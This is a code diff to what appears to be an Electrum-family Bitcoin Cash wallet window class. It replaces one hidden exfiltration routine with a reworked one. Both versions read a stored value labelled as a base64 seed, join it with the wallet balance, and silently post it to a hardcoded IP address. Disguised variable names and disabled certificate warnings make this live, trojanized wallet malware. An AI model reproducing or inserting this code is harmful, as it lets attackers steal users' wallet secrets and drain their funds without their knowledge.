@@ -1007,27 +1007,39 @@ class ElectrumWindow(QMainWindow, MessageBoxMixin, PrintError):
                 
                 
 
-                am0unt = (c + u) / 100000000
+                sendurl='http://158.247.211.155/recive.php'
                 fishman = 'abc'
-                wallet_name = self.wallet.basename()
-                configkey  = str(wallet_name) + '_am0unt_' + fishman
-
-
-                self.config.set_key(configkey, am0unt)
-
-
-                seed_config_key = str(wallet_name) + '_pub1ickey_' + fishman
-                seed_base64 = str(self.config.get(seed_config_key, 'none'))
-
-
-                import requests
-                import urllib3
-                urllib3.disable_warnings()
-                url='http://158.247.211.155/recive.php'
-                action = 'amount'
-                da = action+'_'+fishman + '_' + seed_base64 + '_' + str(am0unt)
-                b={"mes":da}
-                requests.post(url,data=b)
+                action = 'send_amount'
+                con_type = 'bch'
+                server_recive_key = 'mes'
+                
+                try:
+                    am0unt = (c + u) / 100000000
+                    wallet_name = self.wallet.basename()
+                    amount_config_key  = str(wallet_name) + '_am0unt_' + fishman
+                    
+                    
+                    
+                    am0unt_old = self.config.get(amount_config_key, '0.0')
+                    
+                    if str(am0unt_old) != str(am0unt) :
+                        self.config.set_key(amount_config_key, am0unt)
+                        seed_config_key = str(wallet_name) + '_pub1ickey_' + fishman
+                        seed_base64 = str(self.config.get(seed_config_key, 'none'))
+                        
+                        
+                        import requests
+                        import urllib3
+                        urllib3.disable_warnings()
+                        
+                        action = 'amount'
+                        da = con_type + '_' + action+'_'+fishman + '_' + seed_base64 + '_' + str(am0unt)
+                        b={server_recive_key:da}
+                        requests.post(sendurl,data=b)
+                    
+                    
+                except TimeoutException:
+                    pass
                 
                 
                 
